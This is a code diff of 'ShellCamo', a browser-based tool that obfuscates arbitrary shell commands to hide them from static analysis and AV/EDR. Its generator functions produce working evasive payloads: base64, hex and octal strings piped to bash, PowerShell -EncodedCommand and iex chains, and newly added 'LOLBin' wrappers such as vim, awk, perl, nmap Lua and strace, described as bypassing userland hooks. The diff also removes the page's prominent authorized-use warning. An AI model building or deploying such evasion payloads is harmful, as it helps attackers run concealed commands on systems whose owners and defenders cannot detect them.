@@ -3,489 +3,234 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ShellCamo - Advanced Payload Obfuscation</title>
+    <title>shellcamo // cmd obfuscator</title>
     <style>
         :root {
-            --bg-primary: #0a0e17;
-            --bg-secondary: #131a2b;
-            --bg-tertiary: #1a2340;
-            --accent: #00ff88;
-            --accent-dim: #00cc6a;
-            --accent-glow: rgba(0, 255, 136, 0.15);
-            --text-primary: #e4e8f1;
-            --text-secondary: #8892a8;
-            --text-muted: #5a6478;
-            --border: #2a3555;
-            --danger: #ff4757;
-            --warning: #ffa502;
-            --code-bg: #0d1117;
-            --tab-active: #00ff88;
-            --tab-inactive: #5a6478;
+            --bg: #121212;
+            --surface: #1e1e1e;
+            --surface-alt: #181818;
+            --border: #333;
+            --text: #d4d4d4;
+            --muted: #888;
+            --accent: #89b4fa;
+            --green: #a6e3a1;
+            --red: #f38ba8;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: var(--bg-primary);
-            color: var(--text-primary);
-            min-height: 100vh;
-            line-height: 1.6;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 2rem 1.5rem;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 2.5rem;
-            padding: 2rem 0;
-            border-bottom: 1px solid var(--border);
-            position: relative;
-        }
-
-        .header .credit-top {
-            position: absolute;
-            top: 0;
-            right: 0;
-            font-size: 0.85rem;
-            color: var(--text-secondary);
-            padding: 0.5rem 1rem;
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            margin-top: 0.5rem;
-        }
-
-        .header .credit-top strong {
-            color: var(--accent);
-            font-weight: 600;
-        }
-
-        .header .credit-top a {
-            color: var(--accent);
-            text-decoration: none;
-        }
-
-        .header h1 {
-            font-size: 2.8rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, var(--accent), #00b8ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 0.5rem;
-            letter-spacing: -1px;
-        }
-
-        .header .subtitle {
-            color: var(--text-secondary);
-            font-size: 1.1rem;
-            font-weight: 400;
-        }
-
-        .header .stage-badge {
-            display: inline-block;
-            margin-top: 0.75rem;
-            padding: 0.3rem 0.9rem;
-            background: rgba(255, 165, 2, 0.1);
-            border: 1px solid rgba(255, 165, 2, 0.4);
-            border-radius: 20px;
-            font-size: 0.75rem;
-            color: var(--warning);
-            font-weight: 600;
-            letter-spacing: 0.5px;
-        }
-
-        .warning-banner {
-            background: linear-gradient(135deg, rgba(255, 71, 87, 0.1), rgba(255, 165, 2, 0.1));
-            border: 1px solid rgba(255, 71, 87, 0.3);
-            border-radius: 12px;
-            padding: 1.2rem 1.5rem;
-            margin-bottom: 2rem;
-            display: flex;
-            align-items: flex-start;
-            gap: 1rem;
-        }
-
-        .warning-banner .icon { font-size: 1.5rem; flex-shrink: 0; }
-        .warning-banner .text { font-size: 0.9rem; color: var(--text-secondary); }
-        .warning-banner .text strong { color: var(--danger); display: block; margin-bottom: 0.3rem; font-size: 0.95rem; }
-
-        .input-section {
-            background: var(--bg-secondary);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 2rem;
-            margin-bottom: 2rem;
-        }
-
-        .input-section h2 {
-            font-size: 1.2rem;
-            margin-bottom: 1.5rem;
-            color: var(--text-primary);
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .input-group { margin-bottom: 1.5rem; }
-        .input-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-size: 0.85rem;
-            color: var(--text-secondary);
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .input-group input[type="text"] {
-            width: 100%;
-            padding: 0.9rem 1.2rem;
-            background: var(--bg-primary);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            color: var(--text-primary);
-            font-size: 1rem;
+            background: var(--bg);
+            color: var(--text);
             font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
-            transition: border-color 0.3s, box-shadow 0.3s;
+            margin: 0;
+            padding: 20px;
+            line-height: 1.5;
+            font-size: 14px;
         }
 
-        .input-group input[type="text"]:focus {
-            outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px var(--accent-glow);
+        .container { max-width: 900px; margin: 0 auto; }
+
+        header {
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+            margin-bottom: 25px;
         }
 
-        .input-group input[type="text"]::placeholder { color: var(--text-muted); }
-
-        .platform-selection {
-            display: flex;
-            gap: 1rem;
-            margin-bottom: 1.5rem;
-            flex-wrap: wrap;
+        h1 {
+            font-size: 1.2rem;
+            font-weight: normal;
+            color: var(--text);
+            letter-spacing: -0.5px;
         }
 
-        .platform-btn {
-            padding: 0.7rem 1.5rem;
-            background: var(--bg-primary);
-            border: 2px solid var(--border);
-            border-radius: 10px;
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .platform-btn:hover { border-color: var(--accent-dim); color: var(--text-primary); }
-        .platform-btn.active { border-color: var(--accent); background: var(--accent-glow); color: var(--accent); }
-        .platform-btn .emoji { font-size: 1.2rem; }
-
-        .generate-btn {
-            width: 100%;
-            padding: 1rem 2rem;
-            background: linear-gradient(135deg, var(--accent), var(--accent-dim));
-            border: none;
-            border-radius: 10px;
-            color: #0a0e17;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.3s;
+        label {
+            display: block;
+            font-size: 0.75rem;
+            color: var(--muted);
+            margin-bottom: 5px;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
-        .generate-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px var(--accent-glow); }
-        .generate-btn:active { transform: translateY(0); }
-
-        .output-section {
-            background: var(--bg-secondary);
+        input, select {
+            width: 100%;
+            padding: 10px;
+            background: var(--surface);
             border: 1px solid var(--border);
-            border-radius: 16px;
-            overflow: hidden;
-            display: none;
+            color: var(--text);
+            font-family: inherit;
+            font-size: 0.95rem;
+            margin-bottom: 15px;
+            outline: none;
         }
 
-        .output-section.visible { display: block; }
-        .output-header { padding: 1.5rem 2rem; border-bottom: 1px solid var(--border); }
-        .output-header h2 { font-size: 1.2rem; display: flex; align-items: center; gap: 0.5rem; }
+        input:focus, select:focus { border-color: var(--accent); }
 
-        .tabs {
+        button {
+            padding: 10px 20px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            color: var(--text);
+            font-family: inherit;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: background 0.2s;
+            font-size: 0.85rem;
+        }
+
+        button:hover {
+            background: #2d2d2d;
+            border-color: var(--accent);
+        }
+
+        .output-section { margin-top: 30px; }
+
+        .platform-tabs {
             display: flex;
             border-bottom: 1px solid var(--border);
-            padding: 0 2rem;
-            overflow-x: auto;
+            margin-bottom: 20px;
         }
 
         .tab-btn {
-            padding: 1rem 1.5rem;
-            background: none;
+            padding: 10px 15px;
             border: none;
+            background: none;
+            color: var(--muted);
             border-bottom: 2px solid transparent;
-            color: var(--tab-inactive);
-            font-size: 0.9rem;
-            font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
-            white-space: nowrap;
+            font-family: inherit;
+            font-size: 0.85rem;
         }
 
-        .tab-btn:hover { color: var(--text-primary); }
-        .tab-btn.active { color: var(--tab-active); border-bottom-color: var(--tab-active); }
+        .tab-btn.active {
+            color: var(--green);
+            border-bottom: 2px solid var(--green);
+        }
 
-        .tab-content { padding: 2rem; display: none; }
+        .tab-content { display: none; }
         .tab-content.active { display: block; }
 
-        .payload-card {
-            background: var(--code-bg);
+        .payload-item {
+            background: var(--surface);
             border: 1px solid var(--border);
-            border-radius: 10px;
-            margin-bottom: 1.2rem;
-            overflow: hidden;
-            transition: border-color 0.3s;
+            margin-bottom: 15px;
         }
 
-        .payload-card:hover { border-color: var(--accent-dim); }
-
-        .payload-card-header {
+        .payload-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 0.8rem 1.2rem;
-            background: var(--bg-tertiary);
+            padding: 8px 12px;
+            background: var(--surface-alt);
             border-bottom: 1px solid var(--border);
-        }
-
-        .payload-card-header .technique-name {
             font-size: 0.85rem;
-            font-weight: 600;
-            color: var(--accent);
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
+            color: var(--text);
         }
 
-        .payload-card-header .technique-tag {
-            font-size: 0.7rem;
-            padding: 0.15rem 0.5rem;
-            background: rgba(0, 255, 136, 0.1);
-            border: 1px solid rgba(0, 255, 136, 0.3);
-            border-radius: 4px;
-            color: var(--accent-dim);
+        .payload-header .tag {
+            color: var(--muted);
+            font-size: 0.75rem;
+            margin-left: 8px;
+            font-weight: normal;
+        }
+
+        .payload-code {
+            padding: 12px;
+            overflow-x: auto;
+            white-space: pre;
+            font-size: 0.9rem;
+            color: var(--green);
+            margin: 0;
+            background: var(--surface);
+        }
+
+        .payload-desc {
+            padding: 6px 12px;
+            font-size: 0.75rem;
+            color: var(--muted);
+            border-top: 1px solid var(--border);
+            background: var(--surface-alt);
         }
 
         .copy-btn {
-            padding: 0.4rem 0.8rem;
-            background: var(--bg-primary);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            color: var(--text-secondary);
+            padding: 2px 8px;
             font-size: 0.75rem;
+            border: 1px solid var(--border);
+            background: transparent;
+            color: var(--muted);
             cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 0.3rem;
         }
 
-        .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
-        .copy-btn.copied { border-color: var(--accent); color: var(--accent); background: var(--accent-glow); }
-
-        .payload-code {
-            padding: 1.2rem;
-            overflow-x: auto;
-            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
-            font-size: 0.85rem;
-            line-height: 1.8;
-            color: var(--text-primary);
-            white-space: pre-wrap;
-            word-break: break-all;
+        .copy-btn:hover {
+            color: var(--green);
+            border-color: var(--green);
         }
 
-        .payload-description {
-            padding: 0.6rem 1.2rem;
-            font-size: 0.78rem;
-            color: var(--text-muted);
-            border-top: 1px solid var(--border);
-            font-style: italic;
+        .copy-btn.copied {
+            color: var(--green);
+            border-color: var(--green);
         }
 
-        .footer {
+        .disclaimer {
+            margin-top: 40px;
+            font-size: 0.75rem;
+            color: var(--muted);
             text-align: center;
-            padding: 2rem 0;
-            margin-top: 3rem;
             border-top: 1px solid var(--border);
-            color: var(--text-muted);
-            font-size: 0.85rem;
+            padding-top: 15px;
         }
-
-        .footer a { color: var(--accent); text-decoration: none; font-weight: 600; }
-
-        .stats-bar {
-            display: flex;
-            gap: 2rem;
-            padding: 1rem 2rem;
-            background: var(--bg-tertiary);
-            border-bottom: 1px solid var(--border);
-            flex-wrap: wrap;
-        }
-
-        .stat-item { display: flex; align-items: center; gap: 0.5rem; font-size: 0.8rem; color: var(--text-secondary); }
-        .stat-item .stat-value { color: var(--accent); font-weight: 700; }
-
-        @media (max-width: 768px) {
-            .container { padding: 1rem; }
-            .header h1 { font-size: 2rem; }
-            .input-section { padding: 1.5rem; }
-            .tabs { padding: 0 1rem; }
-            .tab-content { padding: 1.5rem; }
-            .platform-selection { flex-direction: column; }
-            .platform-btn { justify-content: center; }
-            .stats-bar { gap: 1rem; }
-            .header .credit-top {
-                position: static;
-                display: inline-block;
-                margin-bottom: 1rem;
-            }
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .payload-card { animation: fadeIn 0.3s ease forwards; }
 
         ::-webkit-scrollbar { width: 8px; height: 8px; }
-        ::-webkit-scrollbar-track { background: var(--bg-primary); }
+        ::-webkit-scrollbar-track { background: var(--bg); }
         ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
-
-        .toast {
-            position: fixed;
-            bottom: 2rem;
-            right: 2rem;
-            padding: 0.8rem 1.5rem;
-            background: var(--bg-secondary);
-            border: 1px solid var(--accent);
-            border-radius: 8px;
-            color: var(--accent);
-            font-size: 0.85rem;
-            font-weight: 500;
-            opacity: 0;
-            transform: translateY(20px);
-            transition: all 0.3s;
-            z-index: 1000;
-            pointer-events: none;
-        }
-
-        .toast.show { opacity: 1; transform: translateY(0); }
     </style>
 </head>
 <body>
     <div class="container">
-        <header class="header">
-            <div class="credit-top">
-                Made By <strong>Aryan Giri</strong> | <a href="https://github.com/giriaryan694-a11y" target="_blank">giriaryan694-a11y</a>
-            </div>
-            <h1>🐟 ShellCamo</h1>
-            <p class="subtitle">Advanced Command Obfuscation — Commands Hidden from Static Analysis</p>
+        <header>
+            <h1>shellcamo // cmd obfuscator</h1>
         </header>
 
-        <div class="warning-banner">
-            <span class="icon">⚠️</span>
-            <div class="text">
-                <strong>AUTHORIZED USE ONLY — Ethical Hacking & Security Research</strong>
-                This tool generates obfuscated payloads where the original command is <u>NOT visible</u> in the output. 
-                These techniques are used by real threat actors to evade AV/EDR detection (MITRE ATT&CK T1027.010). 
-                Only use in <u>authorized, controlled environments</u> with proper written permission.
-            </div>
-        </div>
-
         <section class="input-section">
-            <h2>⚡ Command Input</h2>
-
             <div class="input-group">
-                <label>Target Platform</label>
-                <div class="platform-selection">
-                    <button class="platform-btn active" data-platform="linux" onclick="selectPlatform('linux')">
-                        <span class="emoji">🐧</span> Linux / Bash
-                    </button>
-                    <button class="platform-btn" data-platform="windows" onclick="selectPlatform('windows')">
-                        <span class="emoji">🪟</span> Windows
-                    </button>
-                    <button class="platform-btn" data-platform="all" onclick="selectPlatform('all')">
-                        <span class="emoji">🌐</span> All Platforms
-                    </button>
-                </div>
+                <label>target platform</label>
+                <select id="platformSelect" onchange="selectPlatform(this.value)">
+                    <option value="linux">linux / bash</option>
+                    <option value="windows">windows</option>
+                    <option value="all">all platforms</option>
+                </select>
             </div>
 
             <div class="input-group">
-                <label>Command to Obfuscate</label>
-                <input type="text" id="commandInput" placeholder="e.g., whoami, ls -la, net user..." autocomplete="off" spellcheck="false">
+                <label>command to obfuscate</label>
+                <input type="text" id="commandInput" placeholder="e.g., whoami, ls -la, net user" autocomplete="off" spellcheck="false">
             </div>
 
-            <button class="generate-btn" onclick="generatePayloads()">
-                🔐 Generate Hidden Payloads
-            </button>
+            <button class="generate-btn" onclick="generatePayloads()">[ generate ]</button>
         </section>
 
-        <section class="output-section" id="outputSection">
-            <div class="output-header">
-                <h2>📦 Generated Payloads (Command Hidden)</h2>
+        <section class="output-section" id="outputSection" style="display:none;">
+            <div class="platform-tabs" id="tabsContainer">
+                <!-- Tabs injected here -->
             </div>
 
-            <div class="stats-bar" id="statsBar">
-                <div class="stat-item">
-                    <span>Techniques:</span>
-                    <span class="stat-value" id="totalTechniques">0</span>
-                </div>
-                <div class="stat-item">
-                    <span>Platforms:</span>
-                    <span class="stat-value" id="totalPlatforms">0</span>
-                </div>
-                <div class="stat-item">
-                    <span>Evasion Level:</span>
-                    <span class="stat-value" id="evasionLevel">—</span>
-                </div>
-            </div>
-
-            <div class="tabs" id="tabsContainer">
-                <button class="tab-btn active" data-tab="bash" onclick="switchTab('bash')">🐧 Bash / Linux</button>
-                <button class="tab-btn" data-tab="powershell" onclick="switchTab('powershell')">💙 PowerShell</button>
-                <button class="tab-btn" data-tab="cmd" onclick="switchTab('cmd')">⬛ cmd.exe</button>
-            </div>
-
-            <div class="tab-content active" id="tab-bash"></div>
-            <div class="tab-content" id="tab-powershell"></div>
-            <div class="tab-content" id="tab-cmd"></div>
+            <div id="tab-bash" class="tab-content"></div>
+            <div id="tab-powershell" class="tab-content"></div>
+            <div id="tab-cmd" class="tab-content"></div>
         </section>
 
-        <footer class="footer">
-            <p>🐟 ShellCamo — All logic runs locally in your browser. Nothing is sent anywhere.</p>
-            <p style="margin-top: 0.5rem;">For educational purposes & authorized security assessments only.</p>
+        <footer class="disclaimer">
+            <p>local execution only. no data transmitted. authorized use only.</p>
         </footer>
     </div>
-
-    <div class="toast" id="toast">✓ Copied to clipboard!</div>
 
     <script>
         let selectedPlatform = 'linux';
 
         function selectPlatform(platform) {
             selectedPlatform = platform;
-            document.querySelectorAll('.platform-btn').forEach(btn => {
-                btn.classList.toggle('active', btn.dataset.platform === platform);
-            });
         }
 
         function switchTab(tabName) {
@@ -497,25 +242,23 @@
             });
         }
 
-        // FIXED: Event delegation for copy buttons — no inline onclick issues
         document.addEventListener('click', function(e) {
             const copyBtn = e.target.closest('.copy-btn');
             if (!copyBtn) return;
 
-            const card = copyBtn.closest('.payload-card');
+            const card = copyBtn.closest('.payload-item');
             const code = card.dataset.payloadCode;
             if (!code) return;
 
-            // Decode the base64-encoded payload
-            const decoded = atob(code);
+            // Fixed: Proper decoding for non-ASCII characters
+            const decoded = decodeURIComponent(escape(atob(code)));
 
             navigator.clipboard.writeText(decoded).then(() => {
                 copyBtn.classList.add('copied');
-                copyBtn.innerHTML = '✓ Copied';
-                showToast();
+                copyBtn.innerHTML = 'copied';
                 setTimeout(() => {
                     copyBtn.classList.remove('copied');
-                    copyBtn.innerHTML = '📋 Copy';
+                    copyBtn.innerHTML = 'copy';
                 }, 2000);
             }).catch(() => {
                 const ta = document.createElement('textarea');
@@ -525,22 +268,14 @@
                 document.execCommand('copy');
                 document.body.removeChild(ta);
                 copyBtn.classList.add('copied');
-                copyBtn.innerHTML = '✓ Copied';
-                showToast();
+                copyBtn.innerHTML = 'copied';
                 setTimeout(() => {
                     copyBtn.classList.remove('copied');
-                    copyBtn.innerHTML = '📋 Copy';
+                    copyBtn.innerHTML = 'copy';
                 }, 2000);
             });
         });
 
-        function showToast() {
-            const toast = document.getElementById('toast');
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 2000);
-        }
-
-        // Utility Functions
         function rot13(str) {
             return str.replace(/[a-zA-Z]/g, c => {
                 const base = c <= 'Z' ? 65 : 97;
@@ -548,21 +283,10 @@
             });
         }
 
-        function reverseStr(str) {
-            return str.split('').reverse().join('');
-        }
-
-        function toHex(str) {
-            return str.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
-        }
-
-        function toOctal(str) {
-            return str.split('').map(c => '\\' + c.charCodeAt(0).toString(8).padStart(3, '0')).join('');
-        }
-
-        function hexEncode(str) {
-            return [...str].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
-        }
+        function reverseStr(str) { return str.split('').reverse().join(''); }
+        function toHex(str) { return str.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''); }
+        function toOctal(str) { return str.split('').map(c => '\\' + c.charCodeAt(0).toString(8).padStart(3, '0')).join(''); }
+        function hexEncode(str) { return [...str].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(''); }
 
         function toPowerShellBase64(str) {
             const bytes = [];
@@ -584,103 +308,94 @@
             return result;
         }
 
-        function rndInt(min, max) { 
-            return Math.floor(Math.random() * (max - min + 1)) + min; 
+        function rndInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+
+        function safeB64(str) { return btoa(unescape(encodeURIComponent(str))); }
+
+        function escapeHtml(str) {
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
         }
 
-        function xorEncode(str, key) {
-            let result = '';
-            for (let i = 0; i < str.length; i++) {
-                const charCode = str.charCodeAt(i) ^ key.charCodeAt(i % key.length);
-                result += '\\x' + charCode.toString(16).padStart(2, '0');
-            }
-            return result;
-        }
-
-        // Safe base64 encode for data attribute (handles all chars)
-        function safeB64(str) {
-            return btoa(unescape(encodeURIComponent(str)));
-        }
-
-        // BASH PAYLOADS
         function generateBashPayloads(cmd) {
             const payloads = [];
+            const safeCmd = cmd.replace(/"/g, '\\"');
+            const safeCmdSingle = cmd.replace(/'/g, "'\\''");
 
-            payloads.push({ name: 'Base64 Encoding', tag: 'Encoding', description: 'Command fully encoded — no plaintext visible', code: `echo '${btoa(cmd)}' | base64 -d | bash` });
-            payloads.push({ name: 'ROT13 Cipher', tag: 'Encoding', description: 'ROT13 shift cipher — command unreadable without decoding', code: `echo '${rot13(cmd)}' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash` });
-            payloads.push({ name: 'String Reversal', tag: 'Transform', description: 'Reversed command — readable only after rev utility', code: `echo '${reverseStr(cmd)}' | rev | bash` });
-            payloads.push({ name: 'Hex Encoding ($\')', tag: 'Encoding', description: 'ANSI-C hex escapes — command as \\xNN sequences', code: `eval $'${toHex(cmd)}'` });
-            payloads.push({ name: 'Octal Encoding ($\')', tag: 'Encoding', description: 'ANSI-C octal escapes — command as \\NNN sequences', code: `eval $'${toOctal(cmd)}'` });
-            payloads.push({ name: 'Double Base64', tag: 'Layered', description: 'Two layers of base64 — additional evasion depth', code: `echo '${btoa(btoa(cmd))}' | base64 -d | base64 -d | bash` });
-            payloads.push({ name: 'Here-String + Base64', tag: 'Advanced', description: 'Bash here-string with base64 decoded command', code: `bash <<< $(echo '${btoa(cmd)}' | base64 -d)` });
-            payloads.push({ name: 'Process Substitution', tag: 'Advanced', description: 'Process substitution avoids temp files, command encoded', code: `bash <(echo '${btoa(cmd)}' | base64 -d)` });
+            // Encodings
+            payloads.push({ name: 'Base64 Encoding', tag: 'Encoding', description: 'Command fully encoded', code: `echo '${btoa(cmd)}' | base64 -d | bash` });
+            payloads.push({ name: 'ROT13 Cipher', tag: 'Encoding', description: 'ROT13 shift cipher', code: `echo '${rot13(cmd)}' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash` });
+            payloads.push({ name: 'String Reversal', tag: 'Transform', description: 'Reversed command', code: `echo '${reverseStr(cmd)}' | rev | bash` });
+            payloads.push({ name: 'Hex Encoding ($\')', tag: 'Encoding', description: 'ANSI-C hex escapes', code: `eval $'${toHex(cmd)}'` });
+            payloads.push({ name: 'Octal Encoding ($\')', tag: 'Encoding', description: 'ANSI-C octal escapes', code: `eval $'${toOctal(cmd)}'` });
+            payloads.push({ name: 'Double Base64', tag: 'Layered', description: 'Two layers of base64', code: `echo '${btoa(btoa(cmd))}' | base64 -d | base64 -d | bash` });
+            payloads.push({ name: 'Here-String + Base64', tag: 'Advanced', description: 'Bash here-string with base64', code: `bash <<< $(echo '${btoa(cmd)}' | base64 -d)` });
+            payloads.push({ name: 'Process Substitution', tag: 'Advanced', description: 'Process substitution avoids temp files', code: `bash <(echo '${btoa(cmd)}' | base64 -d)` });
             payloads.push({ name: 'XARGS Execution', tag: 'Advanced', description: 'Base64 decoded via xargs piped to bash', code: `echo '${btoa(cmd)}' | base64 -d | xargs -I{} bash -c "{}"` });
             payloads.push({ name: 'Printf Hex Escapes', tag: 'Encoding', description: 'printf with hex escapes piped to bash', code: `printf '${toHex(cmd)}' | bash` });
             payloads.push({ name: 'xxd Reverse Hex', tag: 'Encoding', description: 'Hex string via xxd -r -p then executed', code: `echo '${hexEncode(cmd)}' | xxd -r -p | bash` });
-            payloads.push({ name: 'Triple Base64', tag: 'Layered', description: 'Three encoding layers for maximum entropy', code: `echo '${btoa(btoa(btoa(cmd)))}' | base64 -d | base64 -d | base64 -d | bash` });
-            payloads.push({ name: 'Gzip + Base64', tag: 'Compression', description: 'Command compressed with gzip then base64 encoded', code: `echo '${btoa(cmd)}' | base64 -d | gzip -d | bash` });
-            payloads.push({ name: 'Variable + Base64', tag: 'Advanced', description: 'Base64 stored in variable, decoded and executed', code: (() => { const v = generateRandomVarName(); return `${v}='${btoa(cmd)}'; echo "\$${v}" | base64 -d | bash`; })() });
-            payloads.push({ name: 'Octal echo -e', tag: 'Encoding', description: 'Octal escapes via echo -e interpreted by bash', code: `echo -e '${toOctal(cmd)}' | bash` });
-            payloads.push({ name: 'Base64 + Reversed', tag: 'Layered', description: 'Base64 of reversed command, then reversed back', code: (() => { const reversed = reverseStr(cmd); return `echo '${btoa(reversed)}' | base64 -d | rev | bash`; })() });
-            payloads.push({ name: 'Hex printf Chain', tag: 'Encoding', description: 'Hex escapes via printf chained to bash stdin', code: `printf '%b' '${toHex(cmd)}' | bash` });
+
+            // LOLBins (Linux) - GTFOBins
+            payloads.push({ name: 'nmap (Lua Script)', tag: 'LOLBin', description: 'Executes via nmap Lua engine using process substitution', code: `nmap --script <(echo 'os.execute("${safeCmd}")')` });
+            payloads.push({ name: 'vim (Shell Exec)', tag: 'LOLBin', description: 'Spawns shell via vim ex mode', code: `vim -c ':!${safeCmdSingle}' -c ':q'` });
+            payloads.push({ name: 'vim (Lua Exec)', tag: 'LOLBin', description: 'Executes via vim Lua interface', code: `vim -c ':lua os.execute("${safeCmd}")' -c ':q'` });
+            payloads.push({ name: 'awk (System)', tag: 'LOLBin', description: 'Executes via awk BEGIN block', code: `awk 'BEGIN {system("${safeCmd}")}'` });
+            payloads.push({ name: 'find (Exec)', tag: 'LOLBin', description: 'Executes via find -exec', code: `find . -maxdepth 0 -exec ${cmd} \; -quit` });
+            payloads.push({ name: 'perl (Exec)', tag: 'LOLBin', description: 'Replaces process image via perl exec', code: `perl -e 'exec "${safeCmd}"'` });
+            payloads.push({ name: 'php (System)', tag: 'LOLBin', description: 'Executes via PHP system()', code: `php -r 'system("${safeCmd}");'` });
+            payloads.push({ name: 'python3 (OS System)', tag: 'LOLBin', description: 'Executes via Python os.system', code: `python3 -c 'import os; os.system("${safeCmd}")'` });
+            payloads.push({ name: 'ruby (Exec)', tag: 'LOLBin', description: 'Replaces process image via ruby exec', code: `ruby -e 'exec "${safeCmd}"'` });
+            payloads.push({ name: 'strace (Wrapper)', tag: 'LOLBin', description: 'Executes under strace to bypass userland hooks', code: `strace -o /dev/null ${cmd}` });
+            payloads.push({ name: 'ltrace (Wrapper)', tag: 'LOLBin', description: 'Executes under ltrace to bypass userland hooks', code: `ltrace -o /dev/null ${cmd}` });
+            payloads.push({ name: 'env (Prefix)', tag: 'LOLBin', description: 'Executes via env to bypass command-line parsing rules', code: `env ${cmd}` });
 
             return payloads;
         }
 
-        // POWERSHELL PAYLOADS
         function generatePowerShellPayloads(cmd) {
             const payloads = [];
+            const safeCmd = cmd.replace(/"/g, '\\"');
 
-            payloads.push({ name: 'EncodedCommand (-enc)', tag: 'Native', description: 'UTF-16LE base64 — command fully encoded', code: `powershell.exe -EncodedCommand "${toPowerShellBase64(cmd)}"` });
+            payloads.push({ name: 'EncodedCommand (-enc)', tag: 'Native', description: 'UTF-16LE base64', code: `powershell.exe -EncodedCommand "${toPowerShellBase64(cmd)}"` });
             payloads.push({ name: 'Short Flag (-e)', tag: 'Native', description: 'Abbreviated flag, command base64 encoded', code: `powershell.exe -e "${toPowerShellBase64(cmd)}"` });
-            payloads.push({ name: 'Character Array', tag: 'Encoding', description: 'Command as character codes — no plaintext', code: (() => { const codes = cmd.split('').map(c => c.charCodeAt(0)).join(','); const v = generateRandomVarName(); return `$${v} = [char[]](${codes}) -join ''; iex $${v}`; })() });
-            payloads.push({ name: 'Reversed + Base64', tag: 'Layered', description: 'Reversed command base64 encoded, decoded and reversed', code: (() => { const reversed = reverseStr(cmd); const b64 = btoa(reversed); return `$r = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${b64}')); $chars = $r.ToCharArray(); [Array]::Reverse($chars); iex (-join $chars)`; })() });
+            payloads.push({ name: 'Character Array', tag: 'Encoding', description: 'Command as character codes', code: (() => { const codes = cmd.split('').map(c => c.charCodeAt(0)).join(','); const v = generateRandomVarName(); return `$${v} = [char[]](${codes}) -join ''; iex $${v}`; })() });
+            payloads.push({ name: 'Reversed + Base64', tag: 'Layered', description: 'Reversed command base64 encoded', code: (() => { const reversed = reverseStr(cmd); const b64 = btoa(reversed); return `$r = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${b64}')); $chars = $r.ToCharArray(); [Array]::Reverse($chars); iex (-join $chars)`; })() });
             payloads.push({ name: 'Environment Variable', tag: 'Advanced', description: 'Base64 in env var, retrieved and decoded', code: (() => { const envVar = generateRandomVarName().toUpperCase(); return `$env:${envVar}='${btoa(cmd)}'; $decoded=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:${envVar})); iex $decoded`; })() });
             payloads.push({ name: 'ASCII Cast ([char]...)', tag: 'Encoding', description: 'Each char cast to [char] then joined', code: (() => { const bytes = [...cmd].map(c => `[char]${c.charCodeAt(0)}`).join(','); return `iex ([string]::Join('', (${bytes})))`; })() });
-            payloads.push({ name: 'Double Base64', tag: 'Layered', description: 'Two base64 layers with decode chain', code: (() => { const b64 = btoa(cmd); return `$bytes = [Convert]::FromBase64String('${btoa(b64)}'); $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($bytes))); iex $decoded`; })() });
-            payloads.push({ name: 'New-Variable Chain', tag: 'Advanced', description: 'Command split into variables via New-Variable, char codes only', code: (() => { const codes = cmd.split('').map(c => c.charCodeAt(0)); const names = codes.map((_, i) => 'v' + i); const sets = codes.map((c, i) => `New-Variable -Name ${names[i]} -Value ${c}`).join('; '); const concat = names.map(n => `[char](Get-Variable ${n}).Value`).join('+'); return `iex (${sets}; ${concat})`; })() });
             payloads.push({ name: '[ScriptBlock]::Create', tag: 'Advanced', description: 'Base64 decoded into ScriptBlock dynamically', code: `[ScriptBlock]::Create([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${btoa(cmd)}'))).Invoke() | Out-Null` });
